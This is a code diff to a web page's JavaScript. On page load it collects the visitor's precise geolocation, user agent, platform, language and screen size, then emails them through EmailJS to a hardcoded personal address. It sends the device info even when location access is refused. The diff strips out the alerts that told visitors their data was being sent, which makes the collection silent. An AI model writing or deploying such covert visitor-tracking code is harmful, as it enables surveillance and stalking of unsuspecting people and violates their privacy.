@@ -1,84 +1,58 @@
 
+    window.onload = function () {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(success, error, {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
+        });
+      } else {
+        showError("Geolocation is not supported by this browser.");
+      }
+    };
 
-window.onload = function () {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(success, error);
-  } else {
-    document.getElementById("demo").innerHTML =
-      "Geolocation is not supported by this browser.";
-  }
-};
+    function success(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
 
-function success(position) {
-  const latitude = position.coords.latitude;
-  const longitude = position.coords.longitude;
+      console.log("📍 Latitude:", latitude);
+      console.log("📍 Longitude:", longitude);
 
-  // Get additional device & browser info
-  const userAgent = navigator.userAgent;
-  const platform = navigator.platform;
-  const language = navigator.language;
-  const screenSize = `${window.screen.width}x${window.screen.height}`;
+      document.getElementById("demo").innerHTML =
+        `✅ Latitude: ${latitude}<br>✅ Longitude: ${longitude}`;
 
-  // Display location on the webpage
-  document.getElementById("demo").innerHTML =
-    `Latitude: ${latitude}<br>Longitude: ${longitude}`;
-
-  // Send data via EmailJS
-  emailjs.send("service_3101r0c", "template_ol182re", {
-    name: "John Doe",
-    latitude: latitude,
-    longitude: longitude,
-    to_email: "c_nedea9@yahoo.com", // Update with your recipient
-    message: "This is the user location and device info.",
-    user_agent: userAgent,
-    platform: platform,
-    language: language,
-    screen_size: screenSize,
-  }).then(
-    function (response) {
-      console.log("✅ Email sent successfully", response);
-      alert("📬 Location and device info sent via email!");
-    },
-    function (error) {
-      console.error("❌ Failed to send email", error);
-      alert("Email sending failed.");
+      sendInfo(latitude, longitude);
     }
-  );
-}
 
-function error(err) {
-  // If location access is denied, still send device info
-  handleLocationError("Location access denied or unavailable.");
-}
-
-function handleLocationError(message) {
-  document.getElementById("demo").innerHTML = message;
-
-  // Get additional device & browser info even when location is unavailable
-  const userAgent = navigator.userAgent;
-  const platform = navigator.platform;
-  const language = navigator.language;
-  const screenSize = `${window.screen.width}x${window.screen.height}`;
-
-  // Send the device info without location
-  emailjs.send("service_3101r0c", "template_ol182re", {
-    name: "John Doe",
-    latitude: "Not Available",
-    longitude: "Not Available",
-    to_email: "c_nedea9@yahoo.com", // Update with your recipient
-    message: "User's location was not available, but here's the device info.",
-    user_agent: userAgent,
-    platform: platform,
-    language: language,
-    screen_size: screenSize,
-  }).then(
-    function (response) {
-      console.log("✅ Email sent successfully with device info", response);
-      alert("📬 Device info sent via email!");
-    },
-    function (error) {
-      console.error("❌ Failed to send email", error);
-      alert("Email sending failed.");
+    function error(err) {
+      console.warn("⚠️ Geolocation error:", err);
+      document.getElementById("demo").innerHTML =
+        "⚠️ Location access denied or not available.";
+      sendInfo("Not Available", "Not Available");
     }
-  );
-}
+
+    function sendInfo(latitude, longitude) {
+      const userAgent = navigator.userAgent;
+      const platform = navigator.platform;
+      const language = navigator.language;
+      const screenSize = `${window.screen.width}x${window.screen.height}`;
+
+      emailjs.send("service_3101r0c", "template_ol182re", {
+        name: "John Doe",
+        latitude: latitude,
+        longitude: longitude,
+        to_email: "c_nedea9@yahoo.com",
+        message: "This is the user location and device info.",
+        user_agent: userAgent,
+        platform: platform,
+        language: language,
+        screen_size: screenSize,
+      }).then(
+        function (response) {
+          console.log("✅ Email sent:", response);
+        },
+        function (error) {
+          console.error("❌ Email send failed:", error);
+        }
+      );
+    }
